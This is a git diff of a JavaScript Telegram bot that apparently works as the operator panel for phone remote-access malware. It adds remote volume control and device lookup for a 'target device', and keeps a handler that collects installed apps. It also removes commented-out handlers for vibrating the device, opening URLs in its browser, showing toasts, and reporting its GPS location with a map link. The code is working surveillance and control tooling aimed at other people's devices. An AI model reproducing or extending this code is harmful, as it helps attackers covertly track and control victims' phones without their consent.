@@ -735,6 +735,167 @@ bot.on("callback_query", async (call) => {
                     message_id: call.message.message_id
                 }
             )
+        } else if (mode == "volumePanel"){
+            await bot.editMessageText(
+                build(`🔊 ${sym} volume-panel for `) + spl[2] + build(`💠 ${sym} selected volume is 50`),
+                {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                {
+                                    text: "⏮",
+                                    callback_data: `svp_${uid}_${spl[2]}_50`
+                                },
+                                {
+                                    text: "50",
+                                    callback_data: `setSoundVolume_${uid}_${spl[2]}_50`
+                                },
+                                {
+                                    text: "⏭",
+                                    callback_data: `svn_${uid}_${spl[2]}_50`
+                                }
+                            ],
+                            [
+                                {
+                                    text: build("↩ back"),
+                                    callback_data: `seemyuser_${uid}_${spl[2]}`
+                                },
+                                {
+                                    text: build("🔼 close"),
+                                    callback_data: `close_${uid}`
+                                }
+                            ]
+                        ]
+                    }
+                }
+            )
+        } else if (mode == "svp"){
+            let volume = parseInt(spl[3]);
+            if ((volume - 5) < 0){
+                await bot.answerCallbackQuery(call.id,
+                    {
+                        text: build(`🔴 ${sym} volume cannot be less than 0`),
+                        show_alert: true
+                    }
+                )
+            } else {
+                await bot.editMessageText(
+                    build(`🔊 ${sym} volume-panel for `) + spl[2] + build(`💠 ${sym} selected volume is ${volume - 5}`),
+                    {
+                        chat_id: call.message.chat.id,
+                        message_id: call.message.message_id,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    {
+                                        text: "⏮",
+                                        callback_data: `svp_${uid}_${spl[2]}_${volume - 5}`
+                                    },
+                                    {
+                                        text: `${volume - 5}`,
+                                        callback_data: `setSoundVolume_${uid}_${spl[2]}_${volume - 5}`
+                                    },
+                                    {
+                                        text: "⏭",
+                                        callback_data: `svn_${uid}_${spl[2]}_${volume - 5}`
+                                    }
+                                ],
+                                [
+                                    {
+                                        text: build("↩ back"),
+                                        callback_data: `seemyuser_${uid}_${spl[2]}`
+                                    },
+                                    {
+                                        text: build("🔼 close"),
+                                        callback_data: `close_${uid}`
+                                    }
+                                ]
+                            ]
+                        }
+                    }
+                )
+            }
+        } else if (mode == "svn"){
+            let volume = parseInt(spl[3]);
+            if ((volume + 5) > 100){
+                await bot.answerCallbackQuery(call.id,
+                    {
+                        text: build(`🔴 ${sym} volume cannot be more than 100`),
+                        show_alert: true
+                    }
+                )
+            } else {
+                await bot.editMessageText(
+                    build(`🔊 ${sym} volume-panel for `) + spl[2] + build(`💠 ${sym} selected volume is ${volume + 5}`),
+                    {
+                        chat_id: call.message.chat.id,
+                        message_id: call.message.message_id,
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    {
+                                        text: "⏮",
+                                        callback_data: `svp_${uid}_${spl[2]}_${volume + 5}`
+                                    },
+                                    {
+                                        text: `${volume + 5}`,
+                                        callback_data: `setSoundVolume_${uid}_${spl[2]}_${volume + 5}`
+                                    },
+                                    {
+                                        text: "⏭",
+                                        callback_data: `svn_${uid}_${spl[2]}_${volume + 5}`
+                                    }
+                                ],
+                                [
+                                    {
+                                        text: build("↩ back"),
+                                        callback_data: `seemyuser_${uid}_${spl[2]}`
+                                    },
+                                    {
+                                        text: build("🔼 close"),
+                                        callback_data: `close_${uid}`
+                                    }
+                                ]
+                            ]
+                        }
+                    }
+                )
+            }
+        } else if (mode == "seemyuser"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "getUserByDeviceId",
+                device_id: spl[2],
+                shortcut: {
+                    way: "seeMenu",
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    msgowner: call.from.id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }))
+        } else if (mode == "setSoundVolume"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "setSoundVolume",
+                device_id: spl[2],
+                volume: parseInt(spl[3]),
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    msgowner: call.from.id,
+                    device_id: spl[2],
+                    volume: parseInt(spl[3]),
+                    edit: true
+                }
+            }))
         }
     }
 })
@@ -751,7 +912,7 @@ me.on("data", async (data) => {
                 if (_message.shortcut){
                     if (_message.shortcut.way == 'seeMenu'){
                         createKeyboard(_message.user.accessory, _message.user.device_id, _message.shortcut.msgowner, async (keyboard) => {
-                            await bot.sendMessage(
+                            _message.shortcut.edit == false ? await bot.sendMessage(
                                 _message.shortcut.chat_id,
                                 build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
                                 {
@@ -761,52 +922,21 @@ me.on("data", async (data) => {
                                         inline_keyboard: keyboard
                                     }
                                 }
+                            ) : await bot.editMessageText(
+                                build("🦋 𓏺|𓏺 user selected\n🌐 𓏺|𓏺 device id: ") + `<code>${_message.user.device_id}</code>` + build(`\n📁 𓏺|𓏺 has ${_message.user.accessory.length} access`),
+                                {
+                                    message_id: _message.shortcut.message_id,
+                                    chat_id: _message.shortcut.chat_id,
+                                    parse_mode: "HTML",
+                                    reply_markup: {
+                                        inline_keyboard: keyboard
+                                    }
+                                }
                             )
                         })
                     }
                 }
-            }// else if (_message.method == "vibratePhone"){
-//                 if (_message.shortcut){
-//                     await bot.editMessageText(
-//                         build(`💠 ${sym} device of ${_message.device_id} were vibrated`),
-//                         {
-//                             message_id: _message.shortcut.message_id,
-//                             chat_id: _message.shortcut.chat_id
-//                         }
-//                     )
-//                 }
-//             } else if (_message.method == "openUrl"){
-//                 if (_message.shortcut){
-//                     await bot.editMessageText(
-//                         build(`🍬 ${sym} user opened the link - `) + `<a href="${_message.shortcut.url}">${build("your link")}</a>` + build(` has opened in defualt-browser of target device\n📽 ${sym} `) + `<code>${_message.device_id}</code>`,
-//                         {
-//                             message_id: _message.shortcut.message_id,
-//                             chat_id: _message.shortcut.chat_id
-//                         }
-//                     )
-//                 }
-//             } else if (_message.method == "sendToast"){
-//                 if (_message.shortcut){
-//                     await bot.editMessageText(
-//                         build(`🍧 ${sym} your message sent successfully & text showed-up`),
-//                         {
-//                             message_id: _message.shortcut.message_id,
-//                             chat_id: _message.shortcut.chat_id
-//                         }
-//                     )
-//                 }
-//             } else if (_message.method == "getGeoLocation"){
-//                 if (_message.shortcut){
-                    // await bot.editMessageText(
-                    //     build(`🗺 ${sym} location detected\n🛰 ${sym} latitude & longitude : `) +  `<code>${_message.latitude},${_message.longitude}</code>` + build(`\n🔬 ${sym} check on `) + `<a href="https://www.google.com/maps/@${_message.latitude},${_message.longitude},15z">${build("google-map")}</a>`,
-                    //     {
-                    //         parse_mode: "HTML",
-                    //         chat_id: _message.shortcut.chat_id,
-                    //         message_id: _message.shortcut.message_id
-                    //     }
-                    // )
-//                 }
-            else if (_message.method == "getInstalledApps"){
+            } else if (_message.method == "getInstalledApps"){
                 if (_message.shortcut){
                     device_apps[_message.device_id] = _message.apps;
                     let srta = sortAppsToString(_message.apps, 0, _message.device_id, _message.shortcut.msgowner)
